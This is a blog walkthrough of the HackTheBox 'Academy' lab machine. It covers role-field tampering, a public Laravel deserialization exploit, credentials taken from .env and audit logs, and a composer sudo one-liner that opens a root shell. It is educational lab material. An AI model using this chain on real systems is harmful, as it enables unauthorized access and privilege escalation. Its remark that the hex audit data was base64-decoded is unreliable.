---
layout: walkthrough
title: HackTheBox - Academy
date: 2021-02-28 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/academy.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Academy --`10.10.10.215`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
nmap -sC -sV 10.10.10.215
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-15 06:16 EST
Nmap scan report for 10.10.10.215
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.78 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `academy.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by doing some web enumeration. 

### Basic Web Enumeration
While browsing the web application, I ran a Gobuster scan, the output of which is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Academy$ sudo gobuster dir -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -s 200 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/15 11:24:42 Starting gobuster
===============================================================
/admin.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/config.php (Status: 200)
/index.php (Status: 200)
===============================================================
2021/02/15 11:35:39 Finished
===============================================================

```

</details>

There were a few interesting pages, namely: `admin` and `register`. After registering I was able to log into the web application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img1.png"  style="width: 90%" />
</p>

While registering, I noticed that there was a `roleid` field which was set to zero:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img2.png"  style="width: 75%" />
</p>

By changing it to `roleid=1` -- I was able to grant myself additional permissions. Using this access, I was able to log in to the `admin.php` panel:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img3.png"  style="width: 90%" />
</p>

The administrative page contained a launch planner for Academy as well as 2 potential usernames. I added `dev-staging-01.academy.htb` to the `/etc/hosts` file and browsed to the web application.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img4.png"  style="width: 90%" />
</p>

The development application seemed to contain error logs for Academy. Looking through the logs, I came across a database with credentials:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img5.png"  style="width: 90%" />
</p>

### Exploiting Larvel 

Unfortunately, those credentials didn't help at the moment. I kept navigating through the development panel and realised that it was running Larvel. Since I knew it was running a Larvel backbone, I had a look for some exploits and came across a token unserialize Remote Code Execution (RCE) vulnerability: <https://www.exploit-db.com/exploits/47129>. I didn't want to use Metasploit (personal preference), so I kept searching and found the following Github page: <https://github.com/aljavier/exploit_laravel_cve-2018-15133>. Running the basic example, I was successfully able to execute the `pwd` command on the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img6.png"  style="width: 65%" />
</p>

Alright, since I knew that I had code execution, I created an interactive shell using the `--interactive` keyword:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img7.png"  style="width: 65%" />
</p>

If you recall, I was in the development branch, but the server also hosted the main Academy application. Traversing the filesystem back to the `academy` branch, I was able to view the `.env` file which contained the credentials for the dev user: 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img8.png"  style="width: 65%" />
</p>

The `.env` file is the location that Larvel uses to store credentials which is why I specifically looked for that file on the host. Now that I had a username and password, I looked at `/etc/passwd` to see which users existed on the machine:

<details>

```bat
egre55❌1000:1000:egre55:/home/egre55:/bin/bash
lxd❌998:1000:/var/snap/lxd/common/lxd:/bin/false
mrb3n❌1001:1001::/home/mrb3n:/bin/sh
cry0l1t3❌1002:1002::/home/cry0l1t3:/bin/sh
mysql❌112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d❌1003:1003::/home/21y4d:/bin/sh
ch4p❌1004:1004::/home/ch4p:/bin/sh
g0blin❌1005:1005::/home/g0blin:/bin/sh
```

</details>

There were quite a few, but going back to the admin panel, 2 usernames stuck out -- `cry0l1t3` and `mrb3n`. I attempted to authenticate with those usernames and I was able to authenticate to the `cry0l1t3` user.

## Lateral Movement using cry0lit3

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img9.png"  style="width: 65%" />
</p>

After authenticating using SSH, I started off by running the `sudo -l` command, however the user was unable to perform privileged functions on the host. Following on, I decided to perform some basic enumeration on the host:

<details>

```bat

cry0l1t3@academy:/var/www/html/academy$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux academy 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
academy
 
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
 
ifconfig:
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.215  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:f7d6  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:f7d6  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:f7:d6  txqueuelen 1000  (Ethernet)
        RX packets 528514  bytes 65823085 (65.8 MB)
        RX errors 0  dropped 209  overruns 0  frame 0
        TX packets 506406  bytes 170798697 (170.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 59818  bytes 4282988 (4.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 59818  bytes 4282988 (4.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
cry0l1t3 adm

```

</details>


As shown above, the user was part of the `adm` group. Running `linpeas` on the host showed that the `adm` group was able to read a large number of files:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img10.png"  style="width: 65%" />
</p>

The `audit` folder seemed to be out of place so I started investigating those files looking for other users which had entries within the `/etc/passwd` file. In order to look for TTY processes, I grepped using the type command followed by each user's UID:

```bat
grep -R "type=TTY\|uid=1002"
```

The command provided a ton of output but looking into the information, I found a large amount of `data` fields within the log files. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img11.png"  style="width: 65%" />
</p>

The following lines contained authentication information:

```bat
audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A                                                                                             
audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" da
ta=6D7262336E5F41634064336D79210A                                                                                 
```

Using base64 decoding, the commands resulted in the following:

```bat
su mrb3n
mrb3n_Ac@d3my!
```

A more efficient method would have been to use `aureport` which is specifically designed to report on the `audit` log files and provide the user with useful statistics. 

## Privilege Escalation using Composer

Success! I now had additional login information. I attempted to authenticate to the `mrb3n` user using the credentials shown above:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img12.png"  style="width: 65%" />
</p>

After authenticating as the `mrb3n` user, I ran `sudo -l` to determine if the user had sudo rights on the machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img13.png"  style="width: 65%" />
</p>

As shown above, the user was able to run sudo for the `composer` command. A quick search on GTFO bins resulted in: <https://gtfobins.github.io/gtfobins/composer/>.

> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

I used the example from GTFO bins which is shown below:

```bat
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x    
```

Running the commands on the host, resulted in a root shell:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Academy/img14.png"  style="width: 65%" />
</p>


That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.